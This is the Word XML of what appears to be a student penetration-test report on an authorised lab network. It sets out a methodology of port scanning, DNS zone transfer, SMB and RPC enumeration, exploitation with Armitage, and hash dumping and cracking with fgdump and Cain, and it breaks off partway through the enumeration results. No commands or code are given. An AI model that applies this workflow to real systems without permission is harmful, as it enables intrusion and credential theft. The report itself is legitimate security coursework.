              <w:t>Appendix B</w:t>
            </w:r>
            <w:r w:rsidR="001E3330">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>15</w:t>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w:rsidR="001E3330" w:rsidRDefault="00132909" w:rsidP="00132909">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:r>
            <w:t xml:space="preserve">     </w:t>
          </w:r>
          <w:hyperlink w:anchor="_Toc453256713" w:history="1">
            <w:r w:rsidR="001E3330" w:rsidRPr="0065613C">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>Appendix C</w:t>
            </w:r>
            <w:r w:rsidR="001E3330">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>15</w:t>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w:rsidR="001E3330" w:rsidRDefault="00132909" w:rsidP="00132909">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:r>
            <w:t xml:space="preserve">     </w:t>
          </w:r>
          <w:hyperlink w:anchor="_Toc453256714" w:history="1">
            <w:r w:rsidR="001E3330" w:rsidRPr="0065613C">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>Appendix D</w:t>
            </w:r>
            <w:r w:rsidR="000112A0">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>....</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>………………………………………………………………………………………………………………………………..</w:t>
            </w:r>
            <w:r w:rsidR="001E3330">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="001E3330">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc453256714 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="001E3330">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="001E3330">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="001E3330">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>1</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>5</w:t>
            </w:r>
            <w:r w:rsidR="001E3330">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w:rsidR="001905B9" w:rsidRDefault="00404615" w:rsidP="001905B9">
          <w:pPr>
            <w:rPr>
              <w:b/>
              <w:bCs/>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
          <w:r>
            <w:rPr>
              <w:b/>
              <w:bCs/>
              <w:noProof/>
            </w:rPr>
            <w:fldChar w:fldCharType="end"/>
          </w:r>
        </w:p>
      </w:sdtContent>
    </w:sdt>
    <w:p w:rsidR="00A60D20" w:rsidRDefault="00A60D20">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:noProof/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p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rsidR="001905B9" w:rsidRDefault="00341658" w:rsidP="00C5090A">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="0" w:name="_Toc453256695"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Introduction</w:t>
      </w:r>
      <w:bookmarkEnd w:id="0"/>
    </w:p>
    <w:p w:rsidR="003B009F" w:rsidRPr="00692399" w:rsidRDefault="003B009F" w:rsidP="00692399">
      <w:pPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="919"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:i/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="004D7B3D" w:rsidRDefault="004D7B3D" w:rsidP="004D7B3D">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:after="236"/>
        <w:ind w:left="1080" w:right="919"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="004D7B3D" w:rsidRDefault="004D7B3D" w:rsidP="00692399">
      <w:pPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF4544" w:rsidRDefault="004D7B3D" w:rsidP="00CF4544">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="37"/>
        </w:numPr>
      </w:pPr>
      <w:bookmarkStart w:id="1" w:name="_Toc453256697"/>
      <w:r>
        <w:t>Aim</w:t>
      </w:r>
      <w:bookmarkEnd w:id="1"/>
    </w:p>
    <w:p w:rsidR="00CF4544" w:rsidRPr="00BE6E58" w:rsidRDefault="00CF4544" w:rsidP="00CF4544">
      <w:pPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="919"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The purpose of this project was to gain access to a network, after having been given user credentials and the </w:t>
      </w:r>
      <w:r w:rsidR="00F21F43">
        <w:t>IP</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> addresses of the clients and servers. Then to offer ways to secure the network from such system exploits.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF4544" w:rsidRPr="00BE6E58" w:rsidRDefault="00CF4544" w:rsidP="00BE6E58">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="37"/>
        </w:numPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="919"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:szCs w:val="30"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00BE6E58">
        <w:rPr>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>Methodology</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00BE6E58" w:rsidRDefault="00291FB1" w:rsidP="00CF4544">
      <w:pPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The first step taken will be to start scanning the target systems, and finding out as much information as possible about them. Information that will be looked for, are the type of operating system being used, which ports are open, which target system holds what </w:t>
      </w:r>
      <w:r w:rsidR="00F21F43">
        <w:t>IP</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> address, and any vulnerabilities in any of the systems on the network. The main thing used at this stage is the command prompt. It will be used to send commands to the target systems, and what information will be gathered will depend on the response from the client/server.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00BE6E58" w:rsidRDefault="00BE6E58" w:rsidP="00CF4544">
      <w:pPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r w:rsidR="001A5C93">
        <w:t>next</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> step in exploiting the system </w:t>
      </w:r>
      <w:r w:rsidR="00291FB1">
        <w:t>is</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to carry out enumeration. This phase </w:t>
      </w:r>
      <w:r w:rsidR="00291FB1">
        <w:t>will be</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> used to find out</w:t>
      </w:r>
      <w:r w:rsidR="001A5C93">
        <w:t xml:space="preserve"> more</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> detailed information about the target system. </w:t>
      </w:r>
      <w:r w:rsidR="001A5C93">
        <w:t xml:space="preserve">SMB Enumeration </w:t>
      </w:r>
      <w:r w:rsidR="00291FB1">
        <w:t>will be</w:t>
      </w:r>
      <w:r w:rsidR="001A5C93">
        <w:t xml:space="preserve"> used to find out information about the domain name and how many users are on the server.</w:t>
      </w:r>
      <w:r w:rsidR="0031410B">
        <w:t xml:space="preserve"> A tool called Nbtenum3.3 will also be used to attempt to find out the usernames on the systems.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="001A5C93" w:rsidRDefault="001A5C93" w:rsidP="00CF4544">
      <w:pPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">After the enumeration stage, vulnerability scanning </w:t>
      </w:r>
      <w:r w:rsidR="00291FB1">
        <w:t>will be</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> carried out. Tools used to find out the vulnerabilities on the network </w:t>
      </w:r>
      <w:r w:rsidR="00291FB1">
        <w:t>are</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> NMAP, and Nessus. </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>In order to</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> exploit these vulnerabilities, Armitage </w:t>
      </w:r>
      <w:r w:rsidR="00291FB1">
        <w:t>will be</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> used on kali. </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="001A5C93" w:rsidRDefault="001A5C93" w:rsidP="00CF4544">
      <w:pPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Once all the relevant information </w:t>
      </w:r>
      <w:r w:rsidR="00291FB1">
        <w:t>is</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00291FB1">
        <w:t>gathered</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, the system hacking phase </w:t>
      </w:r>
      <w:r w:rsidR="00291FB1">
        <w:t>will begin.</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Arm</w:t>
      </w:r>
      <w:r w:rsidR="00291FB1">
        <w:t xml:space="preserve">itage will be </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">used </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>in order to</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> exploit the vulnerabilities found from the vulnerability scanning stage. </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="001A5C93" w:rsidRPr="00BE6E58" w:rsidRDefault="001A5C93" w:rsidP="00CF4544">
      <w:pPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Once access </w:t>
      </w:r>
      <w:r w:rsidR="00291FB1">
        <w:t>is</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> gained to the system, the password cracking</w:t>
      </w:r>
      <w:r w:rsidR="008B5917">
        <w:t xml:space="preserve"> process </w:t>
      </w:r>
      <w:r w:rsidR="00291FB1">
        <w:t>is</w:t>
      </w:r>
      <w:r w:rsidR="008B5917">
        <w:t xml:space="preserve"> started. </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="008B5917">
        <w:t>Fgdump</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="008B5917">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00291FB1">
        <w:t xml:space="preserve">will be used to gain </w:t>
      </w:r>
      <w:r w:rsidR="00291FB1" w:rsidRPr="008F27B2">
        <w:t>the</w:t>
      </w:r>
      <w:r w:rsidR="00291FB1">
        <w:t xml:space="preserve"> password hashes from the target computer. Once all the password hashes are obtained, Cain will be used to crack them.</w:t>
      </w:r>
      <w:r w:rsidR="00291FB1" w:rsidRPr="00BE6E58">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009525A9" w:rsidRDefault="009525A9" w:rsidP="009525A9">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="2" w:name="_Toc453256698"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Procedure</w:t>
      </w:r>
      <w:bookmarkEnd w:id="2"/>
      <w:r w:rsidR="00291FB1">
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidR="007504C1">
        <w:t xml:space="preserve"> and results</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009525A9" w:rsidRDefault="00291FB1" w:rsidP="009525A9">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Scanning</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009525A9" w:rsidRDefault="00291FB1" w:rsidP="00291FB1">
      <w:pPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Given the </w:t>
      </w:r>
      <w:r w:rsidR="00F21F43">
        <w:t>IP</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> addresses – 192.168.0.1, 192.168.0.2, 192.168.0.10 and 192.168.0.11, scanning will be taking </w:t>
      </w:r>
      <w:r w:rsidR="00133EDD">
        <w:t>place</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> on all four of the machines. The type of information that will be searched for</w:t>
      </w:r>
      <w:r w:rsidR="00133EDD">
        <w:t xml:space="preserve"> includes</w:t>
      </w:r>
      <w:r w:rsidRPr="00133EDD">
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00291FB1" w:rsidRDefault="00291FB1" w:rsidP="00291FB1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="38"/>
        </w:numPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">What </w:t>
      </w:r>
      <w:r w:rsidR="00F21F43">
        <w:t>IP</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> address belongs to what computer</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00291FB1" w:rsidRDefault="00291FB1" w:rsidP="00291FB1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="38"/>
        </w:numPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t>The operating systems being used by each machine</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00291FB1" w:rsidRDefault="00291FB1" w:rsidP="00291FB1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="38"/>
        </w:numPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t>What ports are open on the machine.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00291FB1" w:rsidRDefault="00291FB1" w:rsidP="00291FB1">
      <w:pPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="006F4799" w:rsidRDefault="00291FB1" w:rsidP="00291FB1">
      <w:pPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t>The first scan that will be used against the machines will be TCP</w:t>
      </w:r>
      <w:r w:rsidR="006F4799">
        <w:t xml:space="preserve"> port</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> scanning. </w:t>
      </w:r>
      <w:r w:rsidR="006F4799">
        <w:t xml:space="preserve">This will be done using NMAP. </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006F4799" w:rsidRDefault="007504C1" w:rsidP="00291FB1">
      <w:pPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t>Looking at appendix A</w:t>
      </w:r>
      <w:r w:rsidR="006F4799">
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidR="002A7605">
        <w:t>it is seen that from the TCP</w:t>
      </w:r>
      <w:r w:rsidR="006F4799">
        <w:t xml:space="preserve"> scans on </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="006F4799">
        <w:t>all of</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="006F4799">
        <w:t xml:space="preserve"> the </w:t>
      </w:r>
      <w:r w:rsidR="00F21F43">
        <w:t>IP</w:t>
      </w:r>
      <w:r w:rsidR="006F4799">
        <w:t xml:space="preserve"> addresses, all of the operating systems on the machines are that of Windows 7, 8.1. </w:t>
      </w:r>
      <w:r w:rsidR="00885904">
        <w:t>The scans also showed us that port 445 is open, and therefore could potentially be vulnerable to SMB attacks.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006F4799" w:rsidRDefault="006F4799" w:rsidP="00291FB1">
      <w:pPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t>UDP Scans were also carried out, but no new information was found.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006F4799" w:rsidRDefault="006F4799" w:rsidP="00291FB1">
      <w:pPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="006F4799" w:rsidRDefault="006F4799" w:rsidP="00291FB1">
      <w:pPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="004D7B3D" w:rsidRDefault="00885904" w:rsidP="009525A9">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Enumeration</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00885904" w:rsidRDefault="00885904" w:rsidP="00885904">
      <w:r>
        <w:t>From the port scanning phase, it was found out that port 53 is open</w:t>
      </w:r>
      <w:r w:rsidR="00301662">
        <w:t xml:space="preserve"> for the machines with the </w:t>
      </w:r>
      <w:r w:rsidR="00F21F43">
        <w:t>IP</w:t>
      </w:r>
      <w:r w:rsidR="00301662">
        <w:t xml:space="preserve"> address 192.168.0.1, and 192.168.0.2</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. This indicates that DNS zone transfers are possible. </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00301662" w:rsidRDefault="00301662" w:rsidP="00885904">
      <w:r>
        <w:t xml:space="preserve">After the DNS zone transfer had taken part, it </w:t>
      </w:r>
      <w:r w:rsidR="00F21F43">
        <w:t>was possible to find out what IP</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> address belonged to who.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00301662" w:rsidRDefault="00301662" w:rsidP="00885904">
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251659264" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>552450</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>2943225</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="400050" cy="2057400"/>
                <wp:effectExtent l="57150" t="3810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400050"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57BD20" id="_x0000_t32" coordsize="21600,21600" o:spt="32" o:oned="t" path="m,l21600,21600e" filled="f">
                <v:path arrowok="t" fillok="f" o:connecttype="none"/>
                <o:lock v:ext="edit" shapetype="t"/>
              </v:shapetype>
              <v:shape id="Straight Arrow Connector 16" o:spid="_x0000_s1026" type="#_x0000_t32" style="position:absolute;margin-left:43.5pt;margin-top:231.75pt;width:31.5pt;height:162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" strokecolor="#f07f09 [3204]" strokeweight=".5pt">
                <v:stroke endarrow="block" joinstyle="miter"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="30454D90" wp14:editId="18A50490">
            <wp:extent cx="5734050" cy="446828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257" r="39744" b="6267"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5746454" cy="4477955"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                    <a:extLst>
                      <a:ext uri="{53640926-AAD7-44D8-BBD7-CCE9431645EC}">
                        <a14:shadowObscured xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main"/>
                      </a:ext>
                    </a:extLst>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00301662" w:rsidRDefault="00301662" w:rsidP="00885904">
      <w:r>
        <w:t>Figure 2.2.1</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00301662" w:rsidRDefault="00301662" w:rsidP="00885904"/>
    <w:p w:rsidR="00301662" w:rsidRDefault="00301662" w:rsidP="00885904">
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t xml:space="preserve">Looking at figure 2.2.1, </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>it can be seen that the</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00F21F43">
        <w:t>IP</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> address 192.168.0.10 belongs to the machine called “CLIENT1”, and the </w:t>
      </w:r>
      <w:r w:rsidR="00F21F43">
        <w:t>IP</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> address 192.168.0.11 belongs to the machine called “CLIENT2”.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00301662" w:rsidRDefault="00301662" w:rsidP="00885904">
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251660288" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>495300</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>3019425</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="790575" cy="1066800"/>
                <wp:effectExtent l="38100" t="38100" r="2857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79057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BAF32" id="Straight Arrow Connector 18" o:spid="_x0000_s1026" type="#_x0000_t32" style="position:absolute;margin-left:39pt;margin-top:237.75pt;width:62.25pt;height:84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" strokecolor="#f07f09 [3204]" strokeweight=".5pt">
                <v:stroke endarrow="block" joinstyle="miter"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="44BC6DA9" wp14:editId="7309EC35">
            <wp:extent cx="4848225" cy="37036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402" r="39584" b="8547"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4864764" cy="3716318"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                    <a:extLst>
                      <a:ext uri="{53640926-AAD7-44D8-BBD7-CCE9431645EC}">
                        <a14:shadowObscured xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main"/>
                      </a:ext>
                    </a:extLst>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00301662" w:rsidRDefault="00301662" w:rsidP="00885904">
      <w:r>
        <w:t>Figure 2.2.2</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00301662" w:rsidRDefault="00301662" w:rsidP="00885904">
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t xml:space="preserve">Looking at figure 2.2.2, it can be found that the machine with the name “server1” has the </w:t>
      </w:r>
      <w:r w:rsidR="00F21F43">
        <w:t>IP</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> address 192.168.0.1, and that 192.168.0.2 belongs to a machine called “server2”.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00301662" w:rsidRDefault="00301662" w:rsidP="00885904">
      <w:r>
        <w:t xml:space="preserve">From the DNS zone transfer, the names of who the </w:t>
      </w:r>
      <w:r w:rsidR="00F21F43">
        <w:t>IP</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> addresses belong to was found. </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00AA43DC" w:rsidRDefault="00AA43DC" w:rsidP="00AA43DC"/>
    <w:p w:rsidR="00AA43DC" w:rsidRPr="00133EDD" w:rsidRDefault="00AA43DC" w:rsidP="00AA43DC">
      <w:r w:rsidRPr="00133EDD">
        <w:t xml:space="preserve">After carrying out the DNS zone transfer, </w:t>
      </w:r>
      <w:r w:rsidR="00133EDD" w:rsidRPr="00133EDD">
        <w:t>RPC</w:t>
      </w:r>
      <w:r w:rsidRPr="00133EDD">
        <w:t xml:space="preserve"> enumeration was undertaken.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00AA43DC" w:rsidRDefault="00AA43DC" w:rsidP="00885904">
      <w:r w:rsidRPr="00133EDD">
        <w:t xml:space="preserve">The results from the </w:t>
      </w:r>
      <w:r w:rsidR="00133EDD" w:rsidRPr="00133EDD">
        <w:t>RPC</w:t>
      </w:r>
      <w:r w:rsidRPr="00133EDD">
        <w:t xml:space="preserve"> enumeration showed how many users were on the server, and the domain name of the server. Using the credentials that were given, this allowed an </w:t>
      </w:r>
      <w:r w:rsidR="00132909" w:rsidRPr="00133EDD">
        <w:t>RPC</w:t>
      </w:r>
      <w:r w:rsidRPr="00133EDD">
        <w:t xml:space="preserve"> client to be connected to, as seen in figure 2.2.3</w:t>
      </w:r>
    </w:p>
